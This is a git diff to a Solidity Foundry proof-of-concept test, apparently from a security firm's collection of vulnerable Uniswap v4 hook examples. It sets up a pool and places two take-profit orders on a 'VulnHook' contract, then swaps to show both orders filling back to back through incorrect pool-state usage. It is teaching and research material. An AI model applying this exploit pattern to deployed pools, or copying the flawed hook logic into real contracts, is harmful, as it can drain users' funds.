e3174a61564d6704f2153f7b329ab89fc0352719
Vishvesh-osec <vishvesh@osec.io>
2024-05-07 03:10:40 +0530

    Update Files

--- bugs/IncorrectPoolStateUsage/PoC.sol
+++ bugs/IncorrectPoolStateUsage/PoC.sol
@@ -1,18 +1,19 @@
+
+
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
 // Test Related Contracts
 import "forge-std/Test.sol";
-import {Deployers} from "v4-core/test/utils/Deployers.sol";
 import {MockERC20} from "v4-core/lib/solmate/src/test/utils/mocks/MockERC20.sol";
-import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
+import {PoolSwapTest} from "./deps/PoolSwapRouter.sol";
+
 import {Constants} from "v4-core/test/utils/Constants.sol";
 import {SortTokens} from "v4-core/test/utils/SortTokens.sol";
 import { console } from "forge-std/console.sol";
 import {PoolInitializeTest} from "v4-core/src/test/PoolInitializeTest.sol";
 import {PoolModifyPositionTest} from "v4-core/src/test/PoolModifyPositionTest.sol";
-import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
-import {ProtocolFeeControllerTest} from "v4-core/src/test/ProtocolFeeControllerTest.sol";
 
 //interfaces
 import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";
@@ -69,16 +70,92 @@ library HookMiner {
     }
 }
 
-contract VulnHookTest is Test, Deployers {
+contract Deployers {
+    using FeeLibrary for uint24;
+    using PoolIdLibrary for PoolKey;
+
+    // Helpful test constants
+    bytes constant ZERO_BYTES = new bytes(0);
+    uint160 constant SQRT_RATIO_1_1 = Constants.SQRT_RATIO_1_1;
+    uint160 constant SQRT_RATIO_1_2 = Constants.SQRT_RATIO_1_2;
+    uint160 constant SQRT_RATIO_1_4 = Constants.SQRT_RATIO_1_4;
+    uint160 constant SQRT_RATIO_4_1 = Constants.SQRT_RATIO_4_1;
+
+    IPoolManager.ModifyPositionParams internal LIQ_PARAMS =
+        IPoolManager.ModifyPositionParams({tickLower: -120, tickUpper: 120, liquidityDelta: 1e18});
+
+    // Global variables
+    Currency internal currency0;
+    Currency internal currency1;
+    PoolManager manager;
+    PoolModifyPositionTest modifyPositionRouter;
+    PoolSwapTest swapRouter;
+    PoolInitializeTest initializeRouter;
+
+    PoolKey key;
+    PoolKey nativeKey;
+    PoolKey uninitializedKey;
+    PoolKey uninitializedNativeKey;
+
+    function deployFreshManager() internal {
+        manager = new PoolManager(500000);
+    }
+
+    function deployFreshManagerAndRouters() internal {
+        deployFreshManager();
+        swapRouter = new PoolSwapTest(manager);
+        modifyPositionRouter = new PoolModifyPositionTest(manager);
+        initializeRouter = new PoolInitializeTest(manager);
+    }
+
+    function deployMintAndApprove2Currencies() internal returns (Currency, Currency) {
+        MockERC20[] memory tokens = deployTokens(2, 1000 ether);
+
+        address[2] memory toApprove =
+            [address(swapRouter), address(modifyPositionRouter)];
+
+        for (uint256 i = 0; i < toApprove.length; i++) {
+            tokens[0].approve(toApprove[i], 1000 ether);
+            tokens[1].approve(toApprove[i], 1000 ether);
+        }
+
+        return SortTokens.sort(tokens[0], tokens[1]);
+    }
+
+    function deployTokens(uint8 count, uint256 totalSupply) internal returns (MockERC20[] memory tokens) {
+        tokens = new MockERC20[](count);
+        for (uint8 i = 0; i < count; i++) {
+            tokens[i] = new MockERC20("TEST", "TEST", 18);
+            tokens[i].mint(address(this), totalSupply);
+        }
+    }
+}
+
+contract VulnHookTest is Test, Deployers{
     using PoolIdLibrary for PoolKey;
     using CurrencyLibrary for Currency;
     using Hooks for IHooks;
+
+    error NoSwapOccurred();
 
     VulnHook vulnHook;
     PoolId poolId;
 
     MockERC20 token0;
     MockERC20 token1;
+
+    struct CallbackData {
+        address sender;
+        TestSettings testSettings;
+        PoolKey key;
+        IPoolManager.SwapParams params;
+        bytes hookData;
+    }
+
+    struct TestSettings {
+        bool withdrawTokens;
+        bool settleUsingTransfer;
+    }
 
     function setUp() public {
         // creates the pool manager, utility routers, and test tokens
@@ -96,42 +173,40 @@ contract VulnHookTest is Test, Deployers {
             HookMiner.find(address(this), flags, type(VulnHook).creationCode, abi.encode(address(manager)));
         vulnHook = new VulnHook{salt: salt}(IPoolManager(address(manager)));
         require(address(vulnHook) == hookAddress, "VulnHookTest: hook address mismatch");
-
-        // (currency0, currency1) = SortTokens.sort(tokenA, tokenB);
         
-
         // Create the pool
         key = PoolKey(currency0, currency1, 0, 60, IHooks(vulnHook));
         poolId = key.toId();
         initializeRouter.initialize(key, SQRT_RATIO_1_1, ZERO_BYTES);
 
          // Provide liquidity to the pool
-        console.log("Provide liquidity to the pool");
+        console.log("Providing liquidity to the pool");
         modifyPositionRouter.modifyPosition(key, IPoolManager.ModifyPositionParams(-60, 60, 10 ether), ZERO_BYTES);
         modifyPositionRouter.modifyPosition(key, IPoolManager.ModifyPositionParams(-120, 120, 10 ether), ZERO_BYTES);
         modifyPositionRouter.modifyPosition(
             key,
-            IPoolManager.ModifyPositionParams(TickMath.minUsableTick(60), TickMath.maxUsableTick(60), 50 ether),
+            IPoolManager.ModifyPositionParams(TickMath.minUsableTick(60), TickMath.maxUsableTick(60), 60 ether),
             ZERO_BYTES
         );
         console.log("Provided liquidity to the pool");
-
     }
 
-function test_poc() public {
-        // order 1 details
-        int24 tick1 = 120;
+    function test_poc() public {
+       // order 1 details
+        int24 tick1 = 0;
         uint256 amount1 = 10 ether;
         bool zeroForOne = true;
 
+        console.log("Placing a zeroForOne order at tick 0");
         // Place order 1 at tick 100 for 10e18 token0 tokens
         token0.approve(address(vulnHook), amount1);
         int24 tickLower1 = vulnHook.placeOrder(key, tick1, amount1, zeroForOne);
 
         // order 2 details
-        int24 tick2 = 120;
+        int24 tick2 = 100;
         uint256 amount2 = 10 ether;
 
+        console.log("Placing the second zeroForOne order at tick 100");
         // Place order 2 at tick 120 for 10e18 token0 tokens
         token0.approve(address(vulnHook), amount2);
         int24 tickLower2 = vulnHook.placeOrder(key, tick2, amount2, zeroForOne);
@@ -143,70 +218,16 @@ function test_poc() public {
             amountSpecified: 10 ether,
             sqrtPriceLimitX96: TickMath.MAX_SQRT_RATIO - 1
         });
-
+        
         PoolSwapTest.TestSettings memory testSettings = PoolSwapTest
             .TestSettings({withdrawTokens: true, settleUsingTransfer: true});
 
+        console.log("Executing a OneForzero Swap to initate fillorder");
         swapRouter.swap(key, params, testSettings, ZERO_BYTES);
+
+        console.log("Fulfilled both zeroForOne orders back to back!");
     }
 
-
-//  function test_placeOrder() public {
-//         // Place a zeroForOne take-profit order
-//         // for 10e18 token0 tokens
-//         // at tick 100
-
-//         int24 tick = 100;
-//         uint256 amount = 10 ether;
-//         bool zeroForOne = true;
-
-//         // Note the original balance of token0 we have
-//         uint256 originalBalance = token0.balanceOf(address(this));
-
-//         // Place the order
-//         token0.approve(address(vulnHook), amount);
-//         int24 tickLower = vulnHook.placeOrder(key, tick, amount, zeroForOne);
-
-//         // Note the new balance of token0 we have
-//         uint256 newBalance = token0.balanceOf(address(this));
-
-//         // Since we deployed the pool contract with tick spacing = 60
-//         // i.e. the tick can only be a multiple of 60
-//         // and initially the tick is 0
-//         // the tickLower should be 60 since we placed an order at tick 100
-//         assertEq(tickLower, 60);
-
-//         // Ensure that our balance was reduced by `amount` tokens
-//         assertEq(originalBalance - newBalance, amount);
-
-//         // Check the balance of ERC-1155 tokens we received
-//         uint256 tokenId = vulnHook.getTokenId(key, tickLower, zeroForOne);
-//         uint256 tokenBalance = vulnHook.balanceOf(address(this), tokenId);
-
-//         // Ensure that we were, in fact, given ERC-1155 tokens for the order
-//         // equal to the `amount` of token0 tokens we placed the order for
-//         assertTrue(tokenId != 0);
-//         assertEq(tokenBalance, amount);
-//     }
-
-    function swap(
-        PoolKey memory key,
-        bool zeroForOne,
-        int256 amountSpecified,
-        bytes memory hookData
-    ) internal returns (BalanceDelta delta) {
-        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
-            zeroForOne: zeroForOne,
-            amountSpecified: amountSpecified,
-            sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1 
-        });
-
-        PoolSwapTest.TestSettings memory testSettings =
-            PoolSwapTest.TestSettings({withdrawTokens: true, settleUsingTransfer: true});
-
-        delta = swapRouter.swap(key, params, testSettings, hookData);
-    }
- 
     function onERC1155Received(
         address,
         address,
@@ -235,6 +256,5 @@ function test_poc() public {
                     "onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"
                 )
             );
-    }
+    }    
 }
-  
